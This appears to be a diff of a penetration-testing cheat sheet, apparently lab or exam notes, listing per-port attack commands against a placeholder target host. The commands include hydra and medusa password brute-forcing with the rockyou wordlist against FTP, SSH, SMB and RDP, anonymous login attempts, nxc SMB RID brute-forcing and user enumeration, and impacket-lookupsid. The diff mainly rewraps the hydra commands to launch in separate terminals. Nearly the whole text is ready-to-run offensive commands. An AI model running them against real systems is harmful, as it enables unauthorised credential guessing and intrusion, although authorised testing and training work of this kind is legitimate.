@@ -1,16 +1,15 @@
 ### Port 21 (FTP)
 ftp anonymous@$rhost #21
-nmap --script ftp* -p21 -Pn $rhost #21
-hydra -I -l $user -P ~/rockyou.txt -e nsr -t 1 $rhost ftp #21
-medusa -u $user -P ~/rockyou.txt -h $rhost -M ftp #21
+qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ftp; exec zsh'" & disown
+qterminal -e "zsh -c 'medusa -u \$user -P ~/rockyou.txt -h \$rhost -M ftp; exec zsh'" & disown
 
 ### Port 2121 (FTP)
 ftp anonymous@$rhost -P 2121 #2121
-hydra -I -l $user -P ~/rockyou.txt -e nsr -t 1 $rhost ftp -s 2121 #2121
 nmap --script ftp* -p2121 -Pn $rhost #2121
+qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ftp -s 2121; exec zsh'" & disown
 
 ### Port 22 (SSH)
-hydra -I -l $user -P ~/rockyou.txt -e nsr -t 1 $rhost ssh #22
+qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ssh; exec zsh'" & disown
 medusa -u $user -P ~/rockyou.txt -h $rhost -M ssh #22
 
 ### Port 25 (SMTP)
@@ -70,7 +69,7 @@ nxc smb $rhost -u 'anonymous' -p '' --rid-brute #445
 nxc smb $rhost -u "" -p "" --users #445
 nxc smb $rhost -u "" -p "" --pass-pol #445
 impacket-lookupsid anonymous@$rhost #445
-hydra -I -l $user -P ~/rockyou.txt -e nsr -t 1 $rhost smb #445
+qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost smb; exec zsh'" & disown
 
 ### Port 636 (LDAPS)
 # Note: No LDAPS commands were provided in the original list  #636
@@ -79,7 +78,7 @@ hydra -I -l $user -P ~/rockyou.txt -e nsr -t 1 $rhost smb #445
 mysql -u $user -h $rhost #3306 try with no password
 
 ### Port 3389 (RDP)
-hydra -I -l $user -P ~/rockyou.txt -e nsr -t 1 $rhost rdp #3389
+qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost rdp; exec zsh'" & disown
 
 ### Port 6379 (Redis)
 redis-cli -h $rhost #6379
